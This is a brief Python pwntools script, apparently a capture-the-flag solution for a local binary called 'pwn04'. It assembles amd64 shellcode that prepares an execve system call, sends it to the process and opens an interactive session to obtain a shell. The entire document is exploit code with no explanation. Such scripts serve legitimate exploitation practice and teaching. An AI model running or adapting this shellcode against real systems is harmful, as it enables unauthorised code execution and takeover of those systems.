from pwn import *
context(arch='amd64',os='linux')
p=process('./pwn04')
payload='pop rdi;pop rdx;push rsp;pop rdi;'
payload+='xor rsi,rsi;xor rdx,rdx;'
payload+='push 0x3b;pop rax;syscall'
payload=asm(payload)
p.sendline(payload)
p.interactive()
